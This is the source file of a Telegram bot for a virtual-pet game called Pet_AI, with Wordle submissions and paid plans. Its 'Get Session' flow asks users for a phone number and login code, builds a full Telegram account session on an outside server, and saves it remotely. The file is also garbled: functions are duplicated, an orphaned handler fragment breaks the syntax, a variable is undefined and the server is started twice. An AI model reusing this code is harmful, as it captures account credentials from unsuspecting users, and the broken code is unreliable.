const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const express = require("express");
const bodyParser = require("body-parser");

// === CONFIGURATION ===
const token = process.env.TOKEN;
const SERVER = process.env.SERVER;
const PLAN_PRICES_USDT = {
  Basic: 0,
  Advanced: 10,
  "Homo Sapien": 20,
  Hacker: 30
};
const PAYMENT_TIMEOUT = 15 * 60 * 1000;

// === INIT BOT ===
const bot = new TelegramBot(token);
const app = express();
app.use(bodyParser.json());
const WEBHOOK_URL = process.env.WEBHOOK
bot.setWebHook(`${WEBHOOK_URL}/bot${token}`);



// === UTILITY FUNCTIONS ===
function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// === WEBHOOK HANDLER ===
app.post(`/bot${token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// === SESSION MANAGEMENT ===
const sessionFlowState = {};
const Actions = {};

app.get('/', (req, res) => res.status(200).send('Bot is running...'));

async function sendCode(phone) {
  try {
    const res = await axios.post(`${SERVER}/send_code`, { phone });
    return res.data.message === 'Code sent successfully';
  } catch (err) {
    console.error('Send code error:', err.message);
    return false;
  }
}

async function createTelegramSession(phone, code) {
  try {
    const res = await axios.post(`${SERVER}/create_session`, { phone, code });
    return res.data.session || null;
  } catch (err) {
    console.error('Session creation error:', err.message);
    return null;
  }
}

async function saveSessionToDatabase(bot, chatId, session, userId) {
  const registrationTime = Date.now();
  try {
    await axios.post(`${SERVER}/saveinfo`, {
      userId: userId.toString(),
      data: {
        session: session,
        time: registrationTime
      }
    });
  } catch (error) {
    console.error("Session Save Error:", error.message);
  }
}

async function getUserStats(userId) {
  try {
    console.log("[getUserStats] Fetching stats for user:", userId);

    const res = await axios.post(`${SERVER}/getUserStats`, {
      user_id: userId.toString()
    });

    console.log("[getUserStats] Raw response:", res.data);

    const stats = res.data;

    if (stats) {
      const result =
        `🧼: ${stats.clean || 0}%\n` +
        `⚡: ${stats.energy || 0}%\n` +
        `😊: ${stats.happiness || 0}%\n` +
        `♥️: ${stats.health || 0}%\n` +
        `🍗: ${stats.hunger || 0}%\n\n` +
        `🏠 Location: ${stats.in_bedroom ? "Bedroom 🛏️" : "Exploring 🌍"}\n` +
        `💤 Status: ${stats.is_sleeping ? "Sleeping 😴" : "Awake 🐇"}\n` +
        `🔄 Last Updated: ${new Date(stats.updatedAt).toLocaleTimeString()}`;

      console.log("[getUserStats] Final formatted result:", result);
      return result;
    }

    console.log("[getUserStats] No stats object found for user:", userId);
    return "No pet stats available yet";

  } catch (error) {
    console.error("[getUserStats] Error fetching stats:", error.message);
    return "Failed to load pet stats";
  }
}

// First, add this helper function to get Wordle status
async function getWordleStatus(userId) {
  try {
    const res = await axios.post(`${SERVER}/checkWordle`, {
      userId: userId.toString()
    });
    
    if (res.data.exists) {
      return {
        text: res.data.wordle.wordle,
        status: res.data.wordle.status
      };
    }
    return {
      text: "Not submitted yet",
      status: "None"
    };
  } catch (error) {
    console.error("Wordle Status Error:", error);
    return {
      text: "Error fetching",
      status: "Error"
    };
  }
}


// === MESSAGE HANDLERS ===
// === MESSAGE HANDLERS ===  
// === MESSAGE HANDLERS ===  
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const name = msg.from.username || msg.from.first_name || "User";

  try {
    // Fetch stats    
    const userStats = await getUserStats(userId);
    
    // Check if stats exist and are valid (not empty or error messages)
    const isRegistered = userStats && 
                        !userStats.includes("Failed to load") && 
                        !userStats.includes("No pet stats available");
    
    if (!isRegistered) {    
      await bot.sendMessage(chatId, "You Need a pet boss?", {    
        reply_markup: {    
          inline_keyboard: [    
            [{ text: "Grab a Bot 0.5$", callback_data: "grab_bot" }],    
            [{ text: "Wordle", callback_data: "wordle_submit" }]    
          ]    
        }    
      });    
      return;    
    }

    // Only show dashboard if we have valid stats
    const wordleStatus = await getWordleStatus(userId);    
    const asciiArt = "(●   ●)\n   ᴖ";    

    const infoText =    
      `${asciiArt}\n\n` +    
      `User: ${name}\n\n` +    
      `Bot: Pet_Ai\nStats:\n${userStats}\n\n` +    
      `Today's Wordle: ${wordleStatus.text} 👉 ${    
        wordleStatus.status === "Verified"    
          ? "✅ Verified"    
          : wordleStatus.status === "Unverified"    
          ? "🕒 Pending"    
          : "❌ Not submitted"    
      }\n\n` +    
      `Status: Active ✅\n\n` +    
      `Submit Daily Wordle with /Wordle {the Word}\n\n` +    
      `Share: https://t.me/ConitioiBot`;    

    await bot.sendMessage(chatId, infoText, {    
      reply_markup: {    
        inline_keyboard: [    
          [{ text: "Errors", callback_data: "errors" }],    
          [{ text: "Support 🧸", callback_data: "chat_support" }]    
        ]    
      }    
    });

  } catch (err) {
    console.error("Start Error:", err.message);
    await bot.sendMessage(chatId, "⚠️ Failed to load user stats");
    await bot.sendMessage(chatId, "You Need a pet boss?", {    
      reply_markup: {    
        inline_keyboard: [    
          [{ text: "Grab a Bot 0.5$", callback_data: "grab_bot" }],    
          [{ text: "Wordle", callback_data: "wordle_submit" }]    
        ]    
      }    
    });
  }
});

async function getUserStats(userId) {
  try {
    console.log("[getUserStats] Fetching stats for user:", userId);

    const res = await axios.post(`${SERVER}/getUserStats`, {
      user_id: userId.toString()
    });

    console.log("[getUserStats] Raw response:", res.data);

    // Check if response contains actual stats data
    if (!res.data || typeof res.data !== 'object') {
      console.log("[getUserStats] No valid stats data received");
      return null;
    }

    const stats = res.data;

    // Check if we have at least one valid stat value
    const hasValidStats = ['clean', 'energy', 'happiness', 'health', 'hunger'].some(
      stat => stats[stat] !== undefined && stats[stat] !== null
    );

    if (!hasValidStats) {
      console.log("[getUserStats] No valid stat values found");
      return null;
    }

    const result =
      `🧼: ${stats.clean || 0}%\n` +
      `⚡: ${stats.energy || 0}%\n` +
      `😊: ${stats.happiness || 0}%\n` +
      `♥️: ${stats.health || 0}%\n` +
      `🍗: ${stats.hunger || 0}%\n\n` +
      `🏠 Location: ${stats.in_bedroom ? "Bedroom 🛏️" : "Exploring 🌍"}\n` +
      `💤 Status: ${stats.is_sleeping ? "Sleeping 😴" : "Awake 🐇"}\n` +
      `🔄 Last Updated: ${stats.updatedAt ? new Date(stats.updatedAt).toLocaleTimeString() : 'Never'}`;

    console.log("[getUserStats] Final formatted result:", result);
    return result;

  } catch (error) {
    console.error("[getUserStats] Error fetching stats:", error.message);
    return null;
  }
}

async function getUserStats(userId) {
  try {
    console.log("[getUserStats] Fetching stats for user:", userId);

    const res = await axios.post(`${SERVER}/getUserStats`, {
      user_id: userId.toString()
    });

    console.log("[getUserStats] Raw response:", res.data);

    // Check if response contains actual stats data
    if (!res.data || typeof res.data !== 'object') {
      console.log("[getUserStats] No valid stats data received");
      return null;
    }

    const stats = res.data;

    // Check if we have at least one valid stat value
    const hasValidStats = ['clean', 'energy', 'happiness', 'health', 'hunger'].some(
      stat => stats[stat] !== undefined && stats[stat] !== null
    );

    if (!hasValidStats) {
      console.log("[getUserStats] No valid stat values found");
      return null;
    }

    const result =
      `🧼: ${stats.clean || 0}%\n` +
      `⚡: ${stats.energy || 0}%\n` +
      `😊: ${stats.happiness || 0}%\n` +
      `♥️: ${stats.health || 0}%\n` +
      `🍗: ${stats.hunger || 0}%\n\n` +
      `🏠 Location: ${stats.in_bedroom ? "Bedroom 🛏️" : "Exploring 🌍"}\n` +
      `💤 Status: ${stats.is_sleeping ? "Sleeping 😴" : "Awake 🐇"}\n` +
      `🔄 Last Updated: ${stats.updatedAt ? new Date(stats.updatedAt).toLocaleTimeString() : 'Never'}`;

    console.log("[getUserStats] Final formatted result:", result);
    return result;

  } catch (error) {
    console.error("[getUserStats] Error fetching stats:", error.message);
    return null;
  }
}

    const wordleStatus = await getWordleStatus(userId);    

    const asciiArt = "(●   ●)\n   ᴖ";    

    const infoText =    
      `${asciiArt}\n\n` +    
      `User: ${name}\n\n` +    
      `Bot: Pet_Ai\nStats:\n${userStats}\n\n` +    
      `Today's Wordle: ${wordleStatus.text} 👉 ${    
        wordleStatus.status === "Verified"    
          ? "✅ Verified"    
          : wordleStatus.status === "Unverified"    
          ? "🕒 Pending"    
          : "❌ Not submitted"    
      }\n\n` +    
      `Status: Active ✅\n\n` +    
      `Submit Daily Wordle with /Wordle {the Word}\n\n` +    
      `Share: https://t.me/ConitioiBot`;    

    await bot.sendMessage(chatId, infoText, {    
      reply_markup: {    
        inline_keyboard: [    
          [{ text: "Errors", callback_data: "errors" }],    
          [{ text: "Support 🧸", callback_data: "chat_support" }]    
        ]    
      }    
    });

  } catch (err) {
    console.error("Start Error:", err.message);
    await bot.sendMessage(chatId, "⚠️ Failed to load user stats or user doesn't exist");
    await bot.sendMessage(chatId, "You Need a pet boss?", {    
      reply_markup: {    
        inline_keyboard: [    
          [{ text: "Grab a Bot 0.5$", callback_data: "grab_bot" }],    
          [{ text: "Wordle", callback_data: "wordle_submit" }]    
        ]    
      }    
    });
  }
});
bot.onText(/\/wordle (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const wordleText = match[1]; // The Wordle text after the command

  try {
    // Check if today's Wordle already exists
    const checkResponse = await axios.post(`${SERVER}/checkWordle`, {
      userId: userId.toString()
    });

    if (checkResponse.data.exists) {
      const existingWordle = checkResponse.data.wordle;
      const sentMessage = await bot.sendMessage(chatId, 
        `🧩 *Wordle Update* 🧩\n\n` +
        `Someone has uploaded today's Wordle and it's *${existingWordle.status}*\n\n` +
        `Check back later 😇\n` +
        `More rewards coming soon! 🧸✨`,
        { parse_mode: "Markdown" }
      );
      
      // Delete after 5 seconds
      setTimeout(() => {
        bot.deleteMessage(chatId, sentMessage.message_id).catch(console.error);
      }, 5000);
      return;
    }

    // Save new Wordle
    const saveResponse = await axios.post(`${SERVER}/saveWordle`, {
      userId: userId.toString(),
      wordle: wordleText,
      status: "Unverified"
    });

    const sentMessage = await bot.sendMessage(chatId,
      `🎯 *Wordle Submitted Successfully!* 🎯\n\n` +
      `✅ You've uploaded today's Wordle!\n\n` +
      `🔍 Once verified, your rewards are *guaranteed*!\n` +
      `🕒 Check back later for your rewards! 🎉`,
      { parse_mode: "Markdown" }
    );

    // Delete after 5 seconds
    setTimeout(() => {
      bot.deleteMessage(chatId, sentMessage.message_id).catch(console.error);
    }, 5000);

  } catch (error) {
    console.error("Wordle Error:", error);
    const sentMessage = await bot.sendMessage(chatId, 
      "⚠️ Failed to process your Wordle. Please try again later.",
      { parse_mode: "Markdown" }
    );
    
    // Delete after 5 seconds
    setTimeout(() => {
      bot.deleteMessage(chatId, sentMessage.message_id).catch(console.error);
    }, 5000);
  }
});

bot.on('callback_query', async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const nameRaw = query.from.username || query.from.first_name || "User";

  try {
    const res = await axios.get(`${SERVER}/getinfo`);
    let user = res.data.find(u => u.id === userId.toString());

    if (!user) {
      const newUser = {
        id: userId.toString(),
        balance: 3000,
        name: nameRaw
      };
      await axios.post(`${SERVER_URL}/saveinfo`, {
        userId: userId.toString(),
        data: newUser
      });
      user = newUser;
    }

    const bufferBalance = user.balance || 0;
    const planRaw = user.plan || "Basic";
    const name = escapeMarkdownV2(nameRaw);
    const plan = escapeMarkdownV2(planRaw);
    const balance = escapeMarkdownV2(bufferBalance.toString());
    const wordleStatus = await getWordleStatus(userId);
  // Handle back_to_main
 if (data === "back_to_main") {
    try {
      const res = await axios.get(`${SERVER}/getinfo`);
      let user = res.data.find(u => u.id === userId.toString());
      const bufferBalance = user.balance || 0;
      const userPlan = user.plan || "Basic"; // Moved this line up before hourlyRate calculation
      const hourlyRate = userPlan === "Premium" ? 120 : 50;
      const planRaw = userPlan; // Using the already defined userPlan
      const name = escapeMarkdownV2(nameRaw);
      const plan = escapeMarkdownV2(planRaw);
      const balance = escapeMarkdownV2(bufferBalance.toString());
      
      const wordleStatus = await getWordleStatus(userId); // Added missing wordleStatus

      const updatedInfoText = 
        `💳 *Buffer Balance:* \`${balance}\` Buff\n💸 *Cost per hour:* \`${hourlyRate}\` Buff\n\n` +
        `👤 ***User:*** \`${name}\`\n📋 ***Plan:*** \`${plan}\`\n\n` +
        `🤖 ***Bot:*** \`Pet_Ai\`\n📊 ***Stats:*** \`${await getUserStats(userId)}\`\n\n` +
        `🧩 *Today's Wordle:* \`${wordleStatus.text}\` 👉 ${wordleStatus.status === "Verified" ? "✅ Verified" : wordleStatus.status === "Unverified" ? "🕒 Pending" : "❌ Not submitted"}\n\n` +
        `🧸Status : Active ✅\n\n` +
        `Submit Daily Wordle for Everyone♥️ use \`/Wordle {the Word}\`\n\n` +
        `Share🧡: \`https://t.me/ConitioiBot\``;

      // Use editMessageMedia instead of delete+send for smoother transition
      await bot.editMessageMedia({
        type: "photo",
        media: 'https://i.ibb.co/d0f0wN4K/image.png', // Use direct image URL (fixed URL format)
        caption: updatedInfoText,
        parse_mode: "MarkdownV2"
      }, {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Terminate", callback_data: "terminate" },
              { text: "Errors", callback_data: "errors" },
              { text: "Chat Support 🧸", callback_data: "chat_support" }
            ],
            [
              { text: "Buy Points", callback_data: "buy_points" }
            ]
          ]
        }
      });

    } catch (error) {
      console.error("Error returning to main:", error);
      await bot.answerCallbackQuery(query.id, {
        text: "⚠️ Failed to return to main menu. Please try /start",
        show_alert: true
      });
    }
    return;
  }

// Add these cases at the beginning of your callback_query handler
if (data === "terminate" || data === "errors" || data === "chat_support" || data === "buy_points") {
  const buttonName = {
    "terminate": "Terminate",
    "errors": "Errors",
    "buy_points": "Buying of points",
    "chat_support": "Chat Support"
  }[data];

  // Handle errors separately
  if (data === "errors") {
    try {
      const res = await axios.post(`${SERVER}/getUserErrors`, {
        user_id: query.from.id.toString()
      });

      const { errorLogs } = res.data;
      let errorText = "🚨 *Last 5 Errors* 🚨\n\n";

      if (errorLogs && errorLogs.length > 0) {
        errorLogs.slice(0, 5).forEach((log) => {
          const timestamp = log.timestamp?.toDate?.()?.getTime() || log.timestamp || Date.now();
          errorText += `⏰ *${new Date(timestamp).toLocaleString()}*\n`;
          errorText += `❌ *Error:* \`${escapeMarkdownV2(log.message?.substring(0, 200) || 'Unknown error')}\`\n\n`;
        });
      } else {
        errorText += "🎉 *No errors found!* Your bot is running smoothly.\n";
      }

      // Delete original message and send new one
      await bot.deleteMessage(chatId, query.message.message_id);
      await bot.sendPhoto(chatId, 'https://ibb.co/d0f0wN4K', {
        caption: errorText,
        parse_mode: "MarkdownV2",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 Back to Main", callback_data: "back_to_main" }]
          ]
        }
      });

    } catch (error) {
      console.error("Error handling errors:", error);
      await bot.answerCallbackQuery(query.id, {
        text: "⚠️ Failed to process errors. Please try again.",
        show_alert: true
      });
    }
    return;
  }

  // Handle other buttons (terminate, chat_support, buy_points)
  await bot.answerCallbackQuery(query.id, {
    text: `⚠️ ${buttonName} feature is not available yet`,
    show_alert: true
  });
  return;
}
if (data.startsWith("restart_")) {
    const userId = data.split("_")[1];

    try {
      // Reset user plan
      await axios.post(`${SERVER}/updateinfo`, {
        userId: userId,
        data: {
            plan: null,
            session: null
           }
      });

      await bot.sendMessage(chatId, `✅ Session restarted! Please send /start again to reconnect.`);
    } catch (err) {
      console.error("Restart error:", err.message);
      await bot.sendMessage(chatId, "⚠️ Failed to restart session. Please try again later.");
    }

    return; // ⛔ Stop here — don’t let other actions run
  }

    if (data === "get_session") {
      Actions[chatId] = { step: "awaiting_phone" };
      const sentMsg = await bot.editMessageText(
        "📱 Please send your phone number in international format (e.g., +123456789).\n\n*Note:* Don't send this Telegram phone number, send the one from your account. Due to Telegram policy, access may be blocked otherwise.",
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
      chatId.lastMessageId = sentMsg.message_id;
      return;
    }

    if (user?.session) {
      const sentMsg = await bot.editMessageText("⚠️ You already have a session.", {
        chat_id: chatId,
        message_id: query.message.message_id
      });
      chatId.lastMessageId = sentMsg.message_id;
      return;
    }

    if (data === "pett_ai") {
      const planText =
`🐾 *Choose Your Pett_AI Subscription Plan:*\n
*Basic*✅ (50 Buff/hour):\n` +
`• Bathe your pet\n` +
`• Sleep/Wake pet\n` +
`• Play Ball Game\n` +
`• Feed (but can't buy food)\n\n` +
`*Premium 🌟* (120 Buff/hour):\n` +
`• All Basic features\n` +
`• Open Doors\n` +
`• Emergency pet revival\n` +
`• Daily Worlde 🤳\n` +
`• Buy food 🥣\n` +
`*Hacker*❌ (100 Buff/action):\n` +
`• Unlock all buttons rapidly\n` +
`• Glitch effects and hacking perks`;

      const buttons = {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Basic", callback_data: "plan_Basic" },
              { text: "premium 🌟", callback_data: "plan_Premium" }
            ],
            [
              { text: "Hacker", callback_data: "plan_Hacker" }
            ],
            [{ text: "💰 Buy More Points", callback_data: "buy_points" }]
          ]
        }
      };

      const sentMsg = await bot.editMessageText(planText, {
        chat_id: chatId,
        message_id: query.message.message_id,
        ...buttons
      });
      chatId.lastMessageId = sentMsg.message_id;
      return;
    }

    if (data.startsWith("plan_")) {
      const planName = data.replace("plan_", "").replace(/_/g, " ");

      try {
        await axios.post(`${SERVER_URL}/saveinfo`, {
          userId: userId.toString(),
          data: {
            ...user,
            plan: planName
          }
        });

        const sessionText = `🧠 Your pet will have a mind of its own... But still loves you.\n\nClick below to get Session.`;
        const sentMsg = await bot.editMessageText(sessionText, {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "Get Session 🧩", callback_data: "get_session" }]]
          }
        });
        chatId.lastMessageId = sentMsg.message_id;
      } catch (error) {
        await bot.editMessageText("❌ Failed to save plan. Please try again.", {
          chat_id: chatId,
          message_id: query.message.message_id
        });
      }
    }
  } catch (error) {
    console.error("Callback query error:", error);
    await bot.answerCallbackQuery(query.id, {
      text: "⚠️ An error occurred. Please try again.",
      show_alert: true
    });
  }
});
bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const msg = callbackQuery.message;

  if (data === "restart_session") {
    await bot.answerCallbackQuery(callbackQuery.id); // Acknowledge button
    await bot.sendMessage(msg.chat.id, "Restarting session...");
    bot.emit("text", { chat: msg.chat, from: msg.from, text: "/start" });
  }

  // handle other callbacks...
});
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userId = msg.from.id;

  if (!Actions[chatId]) return;

  const state = Actions[chatId];

  if (state.step === "awaiting_phone") {
    try {
      await bot.deleteMessage(chatId, msg.message_id);

      state.phone = text;
      state.step = "awaiting_code";

      state.processingMsg = await bot.sendMessage(chatId, "⌛ Sending code to your Telegram...");

      const sent = await sendCode(state.phone);
      if (!sent) {
        await bot.editMessageText("❌ Failed to send code. Please check your phone number and try /start again.", {
          chat_id: chatId,
          message_id: state.processingMsg.message_id
        });
        delete Actions[chatId];
        return;
      }

      await bot.editMessageText("📨 Code sent! Please enter the code you received.", {
        chat_id: chatId,
        message_id: state.processingMsg.message_id
      });

    } catch (error) {
      console.error("Phone processing error:", error);
      if (state.processingMsg?.message_id) {
        await bot.editMessageText("❌ Error processing phone number. Please try /start", {
          chat_id: chatId,
          message_id: state.processingMsg.message_id
        });
      }
      delete Actions[chatId];
    }
    return;
  }

  if (state.step === "awaiting_code") {
    try {
      await bot.deleteMessage(chatId, msg.message_id);

      const code = text;
      const phone = state.phone;

      await bot.editMessageText("⚙️ Creating session, please wait...", {
        chat_id: chatId,
        message_id: state.processingMsg.message_id
      });

      const session = await createTelegramSession(phone, code);

      await bot.deleteMessage(chatId, state.processingMsg.message_id);
      await saveSessionToDatabase(bot, chatId, session, userId);
      await bot.sendMessage(chatId, "🧸 Setup complete! You can now use /start");
    } catch (error) {
      console.error("Session creation error:", error);
      if (state.processingMsg?.message_id) {
        await bot.editMessageText("❌ Failed to create session. Please try /start again.", {
          chat_id: chatId,
          message_id: state.processingMsg.message_id
        });
      }
    } finally {
      delete Actions[chatId];
    }
  }
});
// Add this before your server start code
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// === SERVER START ===
app.listen(3000, () => {
  console.log("Webhook server running on port 3000");
});

// === SERVER START ===
app.listen(3000, () => {
  console.log("Webhook server running on port 3000");
});
